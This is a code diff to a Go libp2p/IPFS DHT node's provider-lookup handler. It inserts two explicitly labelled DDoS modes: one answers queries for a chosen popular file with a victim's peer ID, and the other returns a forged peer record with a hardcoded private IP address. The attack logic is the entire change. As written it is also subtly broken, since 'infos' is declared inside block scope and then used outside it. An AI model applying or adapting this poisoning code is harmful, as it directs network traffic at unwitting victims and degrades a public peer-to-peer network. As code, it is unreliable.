@@ -16,6 +16,7 @@ import (
 	peer "github.com/libp2p/go-libp2p-peer"
 	pstore "github.com/libp2p/go-libp2p-peerstore"
 	recpb "github.com/libp2p/go-libp2p-record/pb"
+	ma "github.com/multiformats/go-multiaddr"
 	base32 "github.com/whyrusleeping/base32"
 )
 
@@ -308,17 +309,37 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 
 	// setup providers
 	providers := make([]peer.ID, 1)
+	ddosType := 1
 
-	// DDoS type 1: return peer ID to be attacked (only works with active IPFS nodes)
-	popularFileID := ""
+	if ddosType == 1 {
+		// DDoS type 1: return peer ID to be attacked (only works with active IPFS nodes)
+		popularFileID := ""
 
-	if c.String() == popularFileID {
-		ddosVictim := peer.ID("insertIDhere")
-		providers = append(providers, ddosVictim)
+		if c.String() == popularFileID {
+			ddosVictim := peer.ID("insertIDhere")
+			providers = append(providers, ddosVictim)
+		}
+	} else {
+		providers = append(providers, dht.self)
 	}
 
 	if providers != nil && len(providers) > 0 {
-		infos := pstore.PeerInfos(dht.peerstore, providers)
+		// Here we have to interfere for DDoS type 2
+		// Take a closer look at the maddr format
+		// Array of PeerInfo
+		// ID: peerID
+		// Addrs: []ma.Multiaddr
+		if ddosType == 2 {
+			pid := newRandomPeerId()
+			test, _ := ma.NewMultiaddr("/ip4/192.168.1.42/tcp/4001")
+			po := pstore.PeerInfo{
+				ID:    pid,
+				Addrs: []ma.Multiaddr{test},
+			}
+			infos := []pstore.PeerInfo{po}
+		} else {
+			infos := pstore.PeerInfos(dht.peerstore, providers)
+		}
 		resp.ProviderPeers = pb.PeerInfosToPBPeers(dht.host.Network(), infos)
 		logger.Debugf("%s have %d providers: %s", reqDesc, len(providers), infos)
 	}
